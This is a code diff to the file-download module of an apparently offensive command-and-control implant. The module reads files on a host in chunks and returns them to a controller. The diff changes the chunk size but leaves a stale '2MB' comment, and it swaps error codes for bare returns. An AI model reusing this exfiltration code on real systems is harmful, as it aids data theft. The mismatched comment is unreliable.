@@ -82,18 +82,18 @@ int Download::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 #define ERROR_FILE_ALREADY_OPEN 3
 
 
-const size_t CHUNK_SIZE = 2 * 1024 * 1024; // 2MB
+const size_t CHUNK_SIZE = 1 * 1024 * 1024; // 2MB
 
 
 int Download::recurringExec(C2Message& c2RetMessage) 
 {
-	c2RetMessage.set_instruction(c2RetMessage.instruction());
-	c2RetMessage.set_cmd("");
-	c2RetMessage.set_outputfile(m_outputfile);
-
 	std::vector<char> buffer;
 	if( m_input.is_open() ) 
 	{
+		c2RetMessage.set_instruction(std::to_string(moduleHash));
+		c2RetMessage.set_cmd("");
+		c2RetMessage.set_outputfile(m_outputfile);
+
 		std::streamsize chunkSize = std::min(CHUNK_SIZE, (size_t)(m_fileSize - m_bytesRead));
         buffer.resize(chunkSize);
 
@@ -114,18 +114,17 @@ int Download::recurringExec(C2Message& c2RetMessage)
 				std::string output = std::to_string(m_bytesRead) + "/" + std::to_string(m_fileSize);
 				c2RetMessage.set_returnvalue(output);
 			}
-        } 
+        }
 		else 
 		{
-            c2RetMessage.set_errorCode(ERROR_READ_FILE);
+            return 0;
         }
+		return 1;
 	}
 	else
 	{
-		c2RetMessage.set_errorCode(ERROR_OPEN_FILE);
+		return 0;
 	}
-	
-	return 1;
 }
 
 
@@ -137,7 +136,7 @@ int Download::process(C2Message &c2Message, C2Message &c2RetMessage)
 		return 0;
 	}
 
-	c2RetMessage.set_instruction(c2RetMessage.instruction());
+	c2RetMessage.set_instruction(std::to_string(moduleHash));
 	c2RetMessage.set_cmd("");
 	c2RetMessage.set_inputfile(c2Message.inputfile());
 	c2RetMessage.set_outputfile(c2Message.outputfile());
@@ -181,7 +180,6 @@ int Download::process(C2Message &c2Message, C2Message &c2RetMessage)
 		{
             c2RetMessage.set_errorCode(ERROR_READ_FILE);
         }
-
 	}
 	else
 	{
